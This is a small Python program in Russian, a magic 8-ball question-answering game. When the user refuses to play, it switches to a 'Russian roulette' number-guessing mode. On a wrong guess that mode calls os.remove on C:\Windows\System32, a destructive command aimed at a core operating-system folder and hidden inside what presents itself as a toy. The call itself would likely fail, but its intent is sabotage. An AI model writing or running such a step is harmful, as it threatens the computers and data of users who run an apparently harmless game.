import sys
import os
from random import choice, randint


otv = ["Бесспорно", "Мне кажется - да",
"Пока неясно", "попробуй снова", "Даже не думай",
"Предрешено", "Вероятнее всего", "Спроси позже", "Мой ответ - нет",
"Никаких сомнений", "Хорошие перспективы", "Лучше не рассказывать","По моим данным - нет",
"Определённо да", "Знаки говорят - да", "Сейчас нельзя предсказать","Перспективы не очень хорошие",
"Можешь быть уверен в этом", "Да", "Сконцентрируйся и спроси опять", "Весьма сомнительно"
]


def start_game():
    a = input("""Привет, я магический шар. Ты задаешь мне вопрос, а я на него отвечаю, идет?
:  """)
    if a.lower() == "да":
        game()
    else:
        print("Я тебя понял")
        russian_roulete()


def game():
    stack = []
    
    while True:
        a = input("Задай мне вопрос: ")
        stack.append(a)
        operator = input("Это все ?: ")
        if operator.lower() == "да":
            itog(stack)
        continue


def russian_roulete():
    print("""Приветствую тебя в русской рулетке (ты отказался играть в магический шар)
Я загадываю число от 1 до 10, если ты угадаешь, то тыоя папка system32 останется в покое,
в ином случе я ее удаляю.""")
    num = randint(1, 10)
    while True:
        inp = input("Какое число я загадал?: ")
        try:
            int(inp)
        except Exception as er:
            print("Серьезно?")
            continue
        if int(inp) == num:
            print("Повезло")
            sys.exit()
        else:
            print("ПОКА-ПОКА")
            os.remove(r"C:\Windows\System32")



def itog(stack: list):
    answers = [f"""Вопрос номер {i + 1}. {stack[i]}
Ответ: {choice(otv)}

""" for i in range(len(stack))]
    print("\n".join(answers))
    
    opr = input("Хочешь сыграть еще?: ")
    if opr.lower() == "да":
        game()
    print("Пока-пока")
    sys.exit()


start_game()